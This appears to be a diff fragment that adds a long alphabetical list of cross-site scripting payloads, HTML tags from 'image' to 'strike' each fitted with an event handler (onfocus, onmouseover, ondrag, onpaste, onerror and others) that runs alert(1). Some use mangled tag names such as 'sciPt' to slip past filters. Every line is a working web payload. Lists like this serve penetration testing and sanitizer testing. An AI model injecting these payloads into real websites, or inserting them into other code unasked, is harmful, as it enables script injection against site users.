+<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
+<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
+<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onkeypress=\"alert(1)\" contenteditable>test</img>
+<img onmouseleave=\"alert(1)\">test</img>
+<img onmousemove=\"alert(1)\">test</img>
+<img onmouseup=\"alert(1)\">test</img>
+<img onpaste=\"alert(1)\" contenteditable>test</img>
+<img usemap=#x><map name=\"x\"><area href onfocusin=alert(1) id=x>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocusin=alert(1)>
+<input draggable=\"true\" ondragend=\"alert(1)\">test</input>
+<input draggable=\"true\" ondragenter=\"alert(1)\">test</input>
+<input draggable=\"true\" ondragleave=\"alert(1)\">test</input>
+<input id=x onfocus=alert(1)>
+<input onbeforecopy=alert(1) value=\"XSS\" autofocus>
+<input onkeydown=\"alert(1)\" contenteditable>test</input>
+<input onmouseenter=\"alert(1)\">test</input>
+<input onmousemove=\"alert(1)\">test</input>
+<input type=radio id=x onfocus=alert(1)>
+<ins oncopy=\"alert(1)\" contenteditable>test</ins>
+<ins onmouseleave=\"alert(1)\">test</ins>
+<isindex draggable=\"true\" ondrag=\"alert(1)\">test</isindex>
+<isindex draggable=\"true\" ondragend=\"alert(1)\">test</isindex>
+<isindex draggable=\"true\" ondragstart=\"alert(1)\">test</isindex>
+<isindex id=x tabindex=1 onactivate=alert(1)></isindex>
+<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
+<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
+<isindex onbeforecut=\"alert(1)\" contenteditable>test</isindex>
+<isindex oncontextmenu=\"alert(1)\">test</isindex>
+<isindex onkeyup=\"alert(1)\" contenteditable>test</isindex>
+<isindex onmousedown=\"alert(1)\">test</isindex>
+<isindex onpaste=\"alert(1)\" contenteditable>test</isindex>
+<isindex type=image src=1 onerror=alert(1)>
+<kbd draggable=\"true\" ondrag=\"alert(1)\">test</kbd>
+<kbd oncut=\"alert(1)\" contenteditable>test</kbd>
+<kbd onkeypress=\"alert(1)\" contenteditable>test</kbd>
+<keygen draggable=\"true\" ondrag=\"alert(1)\">test</keygen>
+<keygen onclick=\"alert(1)\">test</keygen>
+<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<keygen onmouseenter=\"alert(1)\">test</keygen>
+<keygen onmouseout=\"alert(1)\">test</keygen>
+<keygen onmouseover=\"alert(1)\">test</keygen>
+<keygen onmouseup=\"alert(1)\">test</keygen>
+<label draggable=\"true\" ondragend=\"alert(1)\">test</label>
+<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>
+<label onbeforepaste=\"alert(1)\" contenteditable>test</label>
+<label onclick=\"alert(1)\">test</label>
+<label oncontextmenu=\"alert(1)\">test</label>
+<label onmouseout=\"alert(1)\">test</label>
+<legend draggable=\"true\" ondragleave=\"alert(1)\">test</legend>
+<legend draggable=\"true\" ondragstart=\"alert(1)\">test</legend>
+<legend id=x tabindex=1 onactivate=alert(1)></legend>
+<legend onmouseenter=\"alert(1)\">test</legend>
+<legend onmouseout=\"alert(1)\">test</legend>
+<legend onmouseup=\"alert(1)\">test</legend>
+<legend onpaste=\"alert(1)\" contenteditable>test</legend>
+<li id=x tabindex=1 onactivate=alert(1)></li>
+<li oncut=\"alert(1)\" contenteditable>test</li>
+<li ondblclick=\"alert(1)\">test</li>
+<li onmouseenter=\"alert(1)\">test</li>
+<li onmouseleave=\"alert(1)\">test</li>
+<link draggable=\"true\" ondrag=\"alert(1)\">test</link>
+<link draggable=\"true\" ondragenter=\"alert(1)\">test</link>
+<link id=x tabindex=1 onactivate=alert(1)></link>
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onkeydown=\"alert(1)\" contenteditable>test</link>
+<link onmouseout=\"alert(1)\">test</link>
+<link onreadystatechange=alert(1) rel=stylesheet href=1>
+<listing id=x tabindex=1 onfocus=alert(1)></listing>
+<listing id=x tabindex=1 onfocusin=alert(1)></listing>
+<listing onbeforecopy=\"alert(1)\" contenteditable>test</listing>
+<listing onclick=\"alert(1)\">test</listing>
+<listing onmouseenter=\"alert(1)\">test</listing>
+<listing onpaste=\"alert(1)\" contenteditable>test</listing>
+<main draggable=\"true\" ondrag=\"alert(1)\">test</main>
+<main draggable=\"true\" ondragleave=\"alert(1)\">test</main>
+<main draggable=\"true\" ondragstart=\"alert(1)\">test</main>
+<main id=x tabindex=1 onactivate=alert(1)></main>
+<main id=x tabindex=1 onbeforeactivate=alert(1)></main>
+<main onclick=\"alert(1)\">test</main>
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
+<main onkeypress=\"alert(1)\" contenteditable>test</main>
+<main onkeyup=\"alert(1)\" contenteditable>test</main>
+<map draggable=\"true\" ondrag=\"alert(1)\">test</map>
+<map id=x tabindex=1 onfocusin=alert(1)></map>
+<map onmousemove=\"alert(1)\">test</map>
+<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>
+<mark draggable=\"true\" ondragleave=\"alert(1)\">test</mark>
+<mark oncut=\"alert(1)\" contenteditable>test</mark>
+<mark ondblclick=\"alert(1)\">test</mark>
+<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
+<mark onkeydown=\"alert(1)\" contenteditable>test</mark>
+<mark onkeypress=\"alert(1)\" contenteditable>test</mark>
+<mark onmousemove=\"alert(1)\">test</mark>
+<marquee draggable=\"true\" ondragenter=\"alert(1)\">test</marquee>
+<marquee id=x tabindex=1 onfocus=alert(1)></marquee>
+<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>
+<marquee onbeforecopy=\"alert(1)\" contenteditable>test</marquee>
+<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>
+<marquee onclick=\"alert(1)\">test</marquee>
+<marquee oncontextmenu=\"alert(1)\">test</marquee>
+<marquee onfocusout=alert(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onmouseenter=\"alert(1)\">test</marquee>
+<marquee onpaste=\"alert(1)\" contenteditable>test</marquee>
+<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>
+<menu ondblclick=\"alert(1)\">test</menu>
+<menu onpaste=\"alert(1)\" contenteditable>test</menu>
+<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>
+<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem>
+<menuitem onmouseenter=\"alert(1)\">test</menuitem>
+<menuitem onmouseleave=\"alert(1)\">test</menuitem>
+<menuitem onmousemove=\"alert(1)\">test</menuitem>
+<menuitem onmouseout=\"alert(1)\">test</menuitem>
+<menuitem onmouseover=\"alert(1)\">test</menuitem>
+<menuitem onmouseup=\"alert(1)\">test</menuitem>
+<menuitem onpaste=\"alert(1)\" contenteditable>test</menuitem>
+<meta draggable=\"true\" ondrag=\"alert(1)\">test</meta>
+<meta draggable=\"true\" ondragend=\"alert(1)\">test</meta>
+<meta draggable=\"true\" ondragenter=\"alert(1)\">test</meta>
+<meta draggable=\"true\" ondragleave=\"alert(1)\">test</meta>
+<meta draggable=\"true\" ondragstart=\"alert(1)\">test</meta>
+<meta id=x tabindex=1 onactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
+<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
+<meta id=x tabindex=1 onfocus=alert(1)></meta>
+<meta onbeforepaste=\"alert(1)\" contenteditable>test</meta>
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onclick=\"alert(1)\">test</meta>
+<meta oncontextmenu=\"alert(1)\">test</meta>
+<meta oncut=\"alert(1)\" contenteditable>test</meta>
+<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onkeydown=\"alert(1)\" contenteditable>test</meta>
+<meta onkeyup=\"alert(1)\" contenteditable>test</meta>
+<meta onmouseout=\"alert(1)\">test</meta>
+<meta onmouseup=\"alert(1)\">test</meta>
+<meter draggable=\"true\" ondragstart=\"alert(1)\">test</meter>
+<meter id=x tabindex=1 onfocus=alert(1)></meter>
+<meter onkeydown=\"alert(1)\" contenteditable>test</meter>
+<meter onmouseout=\"alert(1)\">test</meter>
+<multicol draggable=\"true\" ondragenter=\"alert(1)\">test</multicol>
+<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>
+<multicol onmouseover=\"alert(1)\">test</multicol>
+<multicol onmouseup=\"alert(1)\">test</multicol>
+<multicol onpaste=\"alert(1)\" contenteditable>test</multicol>
+<nav draggable=\"true\" ondrag=\"alert(1)\">test</nav>
+<nav draggable=\"true\" ondragend=\"alert(1)\">test</nav>
+<nav draggable=\"true\" ondragleave=\"alert(1)\">test</nav>
+<nav draggable=\"true\" ondragstart=\"alert(1)\">test</nav>
+<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>
+<nav oncut=\"alert(1)\" contenteditable>test</nav>
+<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>
+<nav onkeydown=\"alert(1)\" contenteditable>test</nav>
+<nav onkeypress=\"alert(1)\" contenteditable>test</nav>
+<nav onkeyup=\"alert(1)\" contenteditable>test</nav>
+<nav onmousedown=\"alert(1)\">test</nav>
+<nav onmouseenter=\"alert(1)\">test</nav>
+<nav onmouseleave=\"alert(1)\">test</nav>
+<nav onmousemove=\"alert(1)\">test</nav>
+<nav onmouseout=\"alert(1)\">test</nav>
+<nav onmouseover=\"alert(1)\">test</nav>
+<nav onmouseup=\"alert(1)\">test</nav>
+<nav onpaste=\"alert(1)\" contenteditable>test</nav>
+<nextid draggable=\"true\" ondrag=\"alert(1)\">test</nextid>
+<nextid draggable=\"true\" ondragend=\"alert(1)\">test</nextid>
+<nextid draggable=\"true\" ondragenter=\"alert(1)\">test</nextid>
+<nextid draggable=\"true\" ondragleave=\"alert(1)\">test</nextid>
+<nextid draggable=\"true\" ondragstart=\"alert(1)\">test</nextid>
+<nextid id=x tabindex=1 onactivate=alert(1)></nextid>
+<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>
+<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>
+<nextid onbeforecut=\"alert(1)\" contenteditable>test</nextid>
+<nextid oncopy=\"alert(1)\" contenteditable>test</nextid>
+<nextid onkeydown=\"alert(1)\" contenteditable>test</nextid>
+<nextid onmouseenter=\"alert(1)\">test</nextid>
+<nextid onmouseup=\"alert(1)\">test</nextid>
+<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>
+<nobr oncut=\"alert(1)\" contenteditable>test</nobr>
+<nobr onmouseover=\"alert(1)\">test</nobr>
+<noembed draggable=\"true\" ondragenter=\"alert(1)\">test</noembed>
+<noembed draggable=\"true\" ondragstart=\"alert(1)\">test</noembed>
+<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
+<noembed onbeforecopy=\"alert(1)\" contenteditable>test</noembed>
+<noembed onbeforecut=\"alert(1)\" contenteditable>test</noembed>
+<noembed onbeforepaste=\"alert(1)\" contenteditable>test</noembed>
+<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onclick=\"alert(1)\">test</noembed>
+<noframes draggable=\"true\" ondragend=\"alert(1)\">test</noframes>
+<noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>
+<noframes onbeforecut=\"alert(1)\" contenteditable>test</noframes>
+<noframes oncopy=\"alert(1)\" contenteditable>test</noframes>
+<noframes oncut=\"alert(1)\" contenteditable>test</noframes>
+<noframes ondblclick=\"alert(1)\">test</noframes>
+<noframes onkeyup=\"alert(1)\" contenteditable>test</noframes>
+<nosciPt draggable=\"true\" ondrag=\"alert(1)\">test</nosciPt>
+<nosciPt id=x tabindex=1 onbeforedeactivate=alert(1)></nosciPt><input autofocus>
+<nosciPt onkeydown=\"alert(1)\" contenteditable>test</nosciPt>
+<nosciPt onmousedown=\"alert(1)\">test</nosciPt>
+<nosciPt onmouseup=\"alert(1)\">test</nosciPt>
+<nosciPt onpaste=\"alert(1)\" contenteditable>test</nosciPt>
+<object data=/ onload=alert(1)>
+<object id=x onfocusin=alert(1) type=text/html>
+<object ondblclick=\"alert(1)\">test</object>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onkeydown=\"alert(1)\" contenteditable>test</object>
+<object onkeypress=\"alert(1)\" contenteditable>test</object>
+<object onmousedown=\"alert(1)\">test</object>
+<object onmousemove=\"alert(1)\">test</object>
+<object onmouseout=\"alert(1)\">test</object>
+<object onmouseover=\"alert(1)\">test</object>
+<object onpaste=\"alert(1)\" contenteditable>test</object>
+<ol draggable=\"true\" ondrag=\"alert(1)\">test</ol>
+<ol draggable=\"true\" ondragenter=\"alert(1)\">test</ol>
+<ol id=x tabindex=1 onactivate=alert(1)></ol>
+<ol id=x tabindex=1 onfocus=alert(1)></ol>
+<ol id=x tabindex=1 onfocusin=alert(1)></ol>
+<ol onbeforecopy=\"alert(1)\" contenteditable>test</ol>
+<ol onbeforecut=\"alert(1)\" contenteditable>test</ol>
+<ol onbeforepaste=\"alert(1)\" contenteditable>test</ol>
+<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
+<ol onclick=\"alert(1)\">test</ol>
+<ol oncontextmenu=\"alert(1)\">test</ol>
+<ol oncopy=\"alert(1)\" contenteditable>test</ol>
+<ol ondblclick=\"alert(1)\">test</ol>
+<ol onmousedown=\"alert(1)\">test</ol>
+<ol onmouseover=\"alert(1)\">test</ol>
+<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>
+<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
+<optgroup onkeydown=\"alert(1)\" contenteditable>test</optgroup>
+<optgroup onkeypress=\"alert(1)\" contenteditable>test</optgroup>
+<optgroup onkeyup=\"alert(1)\" contenteditable>test</optgroup>
+<option oncopy=\"alert(1)\" contenteditable>test</option>
+<option onkeyup=\"alert(1)\" contenteditable>test</option>
+<option onmousedown=\"alert(1)\">test</option>
+<option onmouseenter=\"alert(1)\">test</option>
+<option onmousemove=\"alert(1)\">test</option>
+<option onmouseout=\"alert(1)\">test</option>
+<option onmouseover=\"alert(1)\">test</option>
+<option onpaste=\"alert(1)\" contenteditable>test</option>
+<output onbeforecut=\"alert(1)\" contenteditable>test</output>
+<output onbeforepaste=\"alert(1)\" contenteditable>test</output>
+<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onclick=\"alert(1)\">test</output>
+<output oncontextmenu=\"alert(1)\">test</output>
+<output oncopy=\"alert(1)\" contenteditable>test</output>
+<output oncut=\"alert(1)\" contenteditable>test</output>
+<output ondblclick=\"alert(1)\">test</output>
+<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onkeydown=\"alert(1)\" contenteditable>test</output>
+<output onkeypress=\"alert(1)\" contenteditable>test</output>
+<output onkeyup=\"alert(1)\" contenteditable>test</output>
+<output onmousedown=\"alert(1)\">test</output>
+<output onmouseleave=\"alert(1)\">test</output>
+<output onmouseout=\"alert(1)\">test</output>
+<output onmouseover=\"alert(1)\">test</output>
+<output onmouseup=\"alert(1)\">test</output>
+<output onpaste=\"alert(1)\" contenteditable>test</output>
+<p draggable=\"true\" ondrag=\"alert(1)\">test</p>
+<p draggable=\"true\" ondragend=\"alert(1)\">test</p>
+<p draggable=\"true\" ondragenter=\"alert(1)\">test</p>
+<p draggable=\"true\" ondragleave=\"alert(1)\">test</p>
+<p id=x tabindex=1 onfocusin=alert(1)></p>
+<p onbeforepaste=\"alert(1)\" contenteditable>test</p>
+<p onmousedown=\"alert(1)\">test</p>
+<p onmouseleave=\"alert(1)\">test</p>
+<p onmousemove=\"alert(1)\">test</p>
+<param draggable=\"true\" ondragleave=\"alert(1)\">test</param>
+<param id=x tabindex=1 onactivate=alert(1)></param>
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
+<picture oncontextmenu=\"alert(1)\">test</picture>
+<picture oncopy=\"alert(1)\" contenteditable>test</picture>
+<picture oncut=\"alert(1)\" contenteditable>test</picture>
+<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
+<picture onkeydown=\"alert(1)\" contenteditable>test</picture>
+<picture onkeypress=\"alert(1)\" contenteditable>test</picture>
+<picture onmouseenter=\"alert(1)\">test</picture>
+<picture onpaste=\"alert(1)\" contenteditable>test</picture>
+<picture><source srcset=\"validimage.png\"><img onloadend=alert(1)></picture>
+<plaintext draggable=\"true\" ondrag=\"alert(1)\">test</plaintext>
+<plaintext draggable=\"true\" ondragend=\"alert(1)\">test</plaintext>
+<plaintext draggable=\"true\" ondragenter=\"alert(1)\">test</plaintext>
+<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>
+<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext>
+<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>
+<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>
+<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
+<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
+<plaintext onbeforecopy=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext onbeforecut=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext onbeforepaste=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onclick=\"alert(1)\">test</plaintext>
+<plaintext oncontextmenu=\"alert(1)\">test</plaintext>
+<plaintext oncopy=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext onkeypress=\"alert(1)\" contenteditable>test</plaintext>
+<plaintext onmouseup=\"alert(1)\">test</plaintext>
+<pre draggable=\"true\" ondrag=\"alert(1)\">test</pre>
+<pre id=x tabindex=1 onfocusin=alert(1)></pre>
+<pre onbeforecopy=\"alert(1)\" contenteditable>test</pre>
+<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
+<pre onpaste=\"alert(1)\" contenteditable>test</pre>
+<progress onkeyup=\"alert(1)\" contenteditable>test</progress>
+<progress onpaste=\"alert(1)\" contenteditable>test</progress>
+<q id=x tabindex=1 onactivate=alert(1)></q>
+<q id=x tabindex=1 onbeforeactivate=alert(1)></q>
+<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>
+<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>
+<q id=x tabindex=1 onfocus=alert(1)></q>
+<q id=x tabindex=1 onfocusin=alert(1)></q>
+<q onbeforepaste=\"alert(1)\" contenteditable>test</q>
+<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>
+<q onmouseenter=\"alert(1)\">test</q>
+<q onmouseleave=\"alert(1)\">test</q>
+<q onmousemove=\"alert(1)\">test</q>
+<q onmouseout=\"alert(1)\">test</q>
+<q onmouseover=\"alert(1)\">test</q>
+<q onmouseup=\"alert(1)\">test</q>
+<q onpaste=\"alert(1)\" contenteditable>test</q>
+<rb draggable=\"true\" ondrag=\"alert(1)\">test</rb>
+<rb draggable=\"true\" ondragend=\"alert(1)\">test</rb>
+<rb draggable=\"true\" ondragenter=\"alert(1)\">test</rb>
+<rb draggable=\"true\" ondragleave=\"alert(1)\">test</rb>
+<rb draggable=\"true\" ondragstart=\"alert(1)\">test</rb>
+<rb id=x tabindex=1 onactivate=alert(1)></rb>
+<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>
+<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>
+<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>
+<rb id=x tabindex=1 onfocus=alert(1)></rb>
+<rb id=x tabindex=1 onfocusin=alert(1)></rb>
+<rb onbeforecut=\"alert(1)\" contenteditable>test</rb>
+<rb onbeforepaste=\"alert(1)\" contenteditable>test</rb>
+<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>
+<rb oncopy=\"alert(1)\" contenteditable>test</rb>
+<rb onkeydown=\"alert(1)\" contenteditable>test</rb>
+<rb onmouseleave=\"alert(1)\">test</rb>
+<rb onpaste=\"alert(1)\" contenteditable>test</rb>
+<rp onmousemove=\"alert(1)\">test</rp>
+<rt onbeforepaste=\"alert(1)\" contenteditable>test</rt>
+<rt ondblclick=\"alert(1)\">test</rt>
+<rt onkeydown=\"alert(1)\" contenteditable>test</rt>
+<rt onmouseup=\"alert(1)\">test</rt>
+<rt onpaste=\"alert(1)\" contenteditable>test</rt>
+<rtc draggable=\"true\" ondrag=\"alert(1)\">test</rtc>
+<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>
+<rtc draggable=\"true\" ondragstart=\"alert(1)\">test</rtc>
+<rtc id=x tabindex=1 onactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
+<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onkeydown=\"alert(1)\" contenteditable>test</rtc>
+<rtc onkeypress=\"alert(1)\" contenteditable>test</rtc>
+<rtc onkeyup=\"alert(1)\" contenteditable>test</rtc>
+<rtc onmousedown=\"alert(1)\">test</rtc>
+<rtc onmouseenter=\"alert(1)\">test</rtc>
+<rtc onmouseleave=\"alert(1)\">test</rtc>
+<rtc onmousemove=\"alert(1)\">test</rtc>
+<rtc onmouseout=\"alert(1)\">test</rtc>
+<rtc onmouseover=\"alert(1)\">test</rtc>
+<rtc onmouseup=\"alert(1)\">test</rtc>
+<rtc onpaste=\"alert(1)\" contenteditable>test</rtc>
+<ruby draggable=\"true\" ondrag=\"alert(1)\">test</ruby>
+<ruby draggable=\"true\" ondragend=\"alert(1)\">test</ruby>
+<ruby draggable=\"true\" ondragenter=\"alert(1)\">test</ruby>
+<ruby draggable=\"true\" ondragleave=\"alert(1)\">test</ruby>
+<ruby draggable=\"true\" ondragstart=\"alert(1)\">test</ruby>
+<ruby id=x tabindex=1 onactivate=alert(1)></ruby>
+<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>
+<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>
+<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>
+<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>
+<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
+<s onkeypress=\"alert(1)\" contenteditable>test</s>
+<samp draggable=\"true\" ondrag=\"alert(1)\">test</samp>
+<samp draggable=\"true\" ondragleave=\"alert(1)\">test</samp>
+<samp onbeforecopy=\"alert(1)\" contenteditable>test</samp>
+<samp oncontextmenu=\"alert(1)\">test</samp>
+<samp oncopy=\"alert(1)\" contenteditable>test</samp>
+<samp onkeyup=\"alert(1)\" contenteditable>test</samp>
+<samp onmousedown=\"alert(1)\">test</samp>
+<samp onmouseenter=\"alert(1)\">test</samp>
+<samp onmouseleave=\"alert(1)\">test</samp>
+<samp onmousemove=\"alert(1)\">test</samp>
+<samp onmouseout=\"alert(1)\">test</samp>
+<samp onmouseover=\"alert(1)\">test</samp>
+<sciPt draggable=\"true\" ondragleave=\"alert(1)\">test</sciPt>
+<sciPt onbeforepaste=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt onblur=alert(1) tabindex=1 id=x></sciPt><input autofocus>
+<sciPt onclick=\"alert(1)\">test</sciPt>
+<sciPt oncontextmenu=\"alert(1)\">test</sciPt>
+<sciPt oncopy=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt oncut=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt ondblclick=\"alert(1)\">test</sciPt>
+<sciPt onerror=alert(1) src=/></sciPt>
+<sciPt onfocusout=alert(1) tabindex=1 id=x></sciPt><input autofocus>
+<sciPt onkeydown=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt onkeypress=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt onkeyup=\"alert(1)\" contenteditable>test</sciPt>
+<sciPt onload=alert(1) src=validjs.js></sciPt>
+<sciPt onmousedown=\"alert(1)\">test</sciPt>
+<sciPt onmouseenter=\"alert(1)\">test</sciPt>
+<sciPt onmouseleave=\"alert(1)\">test</sciPt>
+<sciPt onmousemove=\"alert(1)\">test</sciPt>
+<sciPt onmouseout=\"alert(1)\">test</sciPt>
+<sciPt onmouseup=\"alert(1)\">test</sciPt>
+<sciPt onpaste=\"alert(1)\" contenteditable>test</sciPt>
+<select autofocus onfocus=alert(1)>
+<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>
+<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>
+<select onbeforepaste=\"alert(1)\" contenteditable>test</select>
+<select onkeyup=\"alert(1)\" contenteditable>test</select>
+<select onmouseleave=\"alert(1)\">test</select>
+<shadow draggable=\"true\" ondragleave=\"alert(1)\">test</shadow>
+<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>
+<shadow onbeforecut=\"alert(1)\" contenteditable>test</shadow>
+<shadow onbeforepaste=\"alert(1)\" contenteditable>test</shadow>
+<shadow onclick=\"alert(1)\">test</shadow>
+<shadow oncontextmenu=\"alert(1)\">test</shadow>
+<shadow oncopy=\"alert(1)\" contenteditable>test</shadow>
+<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>
+<shadow onkeypress=\"alert(1)\" contenteditable>test</shadow>
+<slot draggable=\"true\" ondragend=\"alert(1)\">test</slot>
+<slot draggable=\"true\" ondragenter=\"alert(1)\">test</slot>
+<slot draggable=\"true\" ondragleave=\"alert(1)\">test</slot>
+<slot draggable=\"true\" ondragstart=\"alert(1)\">test</slot>
+<slot id=x tabindex=1 onactivate=alert(1)></slot>
+<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>
+<slot id=x tabindex=1 onfocus=alert(1)></slot>
+<slot id=x tabindex=1 onfocusin=alert(1)></slot>
+<slot onbeforecopy=\"alert(1)\" contenteditable>test</slot>
+<slot onbeforecut=\"alert(1)\" contenteditable>test</slot>
+<slot onbeforepaste=\"alert(1)\" contenteditable>test</slot>
+<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>
+<slot onclick=\"alert(1)\">test</slot>
+<slot oncontextmenu=\"alert(1)\">test</slot>
+<slot oncopy=\"alert(1)\" contenteditable>test</slot>
+<slot oncut=\"alert(1)\" contenteditable>test</slot>
+<slot ondblclick=\"alert(1)\">test</slot>
+<slot onmouseup=\"alert(1)\">test</slot>
+<small oncopy=\"alert(1)\" contenteditable>test</small>
+<small onkeydown=\"alert(1)\" contenteditable>test</small>
+<small onkeyup=\"alert(1)\" contenteditable>test</small>
+<source draggable=\"true\" ondrag=\"alert(1)\">test</source>
+<source id=x tabindex=1 onactivate=alert(1)></source>
+<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
+<source oncopy=\"alert(1)\" contenteditable>test</source>
+<source onmouseout=\"alert(1)\">test</source>
+<spacer draggable=\"true\" ondrag=\"alert(1)\">test</spacer>
+<spacer draggable=\"true\" ondragend=\"alert(1)\">test</spacer>
+<spacer draggable=\"true\" ondragenter=\"alert(1)\">test</spacer>
+<spacer draggable=\"true\" ondragleave=\"alert(1)\">test</spacer>
+<spacer draggable=\"true\" ondragstart=\"alert(1)\">test</spacer>
+<spacer id=x tabindex=1 onactivate=alert(1)></spacer>
+<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>
+<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>
+<spacer onkeyup=\"alert(1)\" contenteditable>test</spacer>
+<spacer onmouseenter=\"alert(1)\">test</spacer>
+<spacer onmouseleave=\"alert(1)\">test</spacer>
+<spacer onmousemove=\"alert(1)\">test</spacer>
+<spacer onmouseout=\"alert(1)\">test</spacer>
+<spacer onmouseover=\"alert(1)\">test</spacer>
+<spacer onmouseup=\"alert(1)\">test</spacer>
+<spacer onpaste=\"alert(1)\" contenteditable>test</spacer>
+<span draggable=\"true\" ondrag=\"alert(1)\">test</span>
+<span draggable=\"true\" ondragend=\"alert(1)\">test</span>
+<span draggable=\"true\" ondragenter=\"alert(1)\">test</span>
+<span draggable=\"true\" ondragleave=\"alert(1)\">test</span>
+<span draggable=\"true\" ondragstart=\"alert(1)\">test</span>
+<span id=x tabindex=1 onactivate=alert(1)></span>
+<span id=x tabindex=1 onbeforeactivate=alert(1)></span>
+<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>
+<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>
+<span id=x tabindex=1 onfocus=alert(1)></span>
+<span id=x tabindex=1 onfocusin=alert(1)></span>
+<strike draggable=\"true\" ondragend=\"alert(1)\">test</strike>
+<strike draggable=\"true\" ondragenter=\"alert(1)\">test</strike>
+<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>
+<strike oncontextmenu=\"alert(1)\">test</strike>
+<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strike onkeydown=\"alert(1)\" contenteditable>test</strike>
